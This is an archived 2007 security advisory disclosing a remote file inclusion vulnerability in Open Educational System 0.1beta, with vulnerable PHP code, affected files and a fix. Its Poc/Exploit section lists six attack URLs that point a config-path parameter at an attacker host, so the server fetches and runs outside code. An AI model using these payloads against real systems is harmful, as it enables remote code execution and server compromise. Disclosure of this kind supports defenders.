@@ -1,0 +1,109 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_69$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_69$2007] OES (Open Educational System) 0.1beta Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : March, 12th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv69-K-159-2007.txt
+Critical Lvl   : Dangerous
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : Open Educational System 
+version       : 0.1beta
+Vendor        : http://openeducation.sourceforge.net
+Description :
+
+OES (Open Educational System) which is a free for use, open source, and multi-platform, multi-language and user-friendy design online e-learning platform.
+The system is integrate and suitable use for any high-school, college or university
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+- Invalid include function at includes/lib-account.inc.php :  
+  	
+----------------includes/lib-account.inc.php-------------------
+<?php
+	// File        : /include/lib-account.inc.php
+	//
+	// Description : This library is for administrator and normal user account mangement.
+
+
+	// Include the configuration file.
+	include_once ( $CONF_CONFIG_PATH.'/config.inc.php' );
+
+	// Include the main include file for running all routine.
+	include_once ( $CONF_INCLUDE_PATH.'/library.inc.php' );
+
+	// Include the ADOdb Class
+	include_once ( $CONF_INCLUDE_PATH.'/adodb/adodb.inc.php');
+
+...
+----------------------------------------------------------------
+
+
+Variables $CONF_INCLUDE_PATH is not properly sanitized.
+When register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.
+
+also affected files :
+
+
+includes/lib-file.inc.php
+includes/lib-group.inc.php
+includes/lib-log.inc.php
+includes/lib-mydb.inc.php
+includes/lib-template-mod.inc.php
+includes/lib-themes.inc.php
+
+Poc/Exploit:
+~~~~~~~~~~
+
+http://www.target.com/[OES_path]/includes/lib-account.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?
+http://www.target.com/[OES_path]/includes/lib-group.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?
+http://www.target.com/[OES_path]/includes/lib-log.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?
+http://www.target.com/[OES_path]/includes/lib-mydb.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?
+http://www.target.com/[OES_path]/includes/lib-template-mod.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?
+http://www.target.com/[OES_path]/includes/lib-themes.inc.php?CONF_CONFIG_PATH=http://attacker.com/evil?
+
+
+Solution:
+~~~~~~~
+
+- Sanitize variable $CONF_INCLUDE_PATH on affected files.
+- Turn off register_globals
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~~
+~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-03-12]
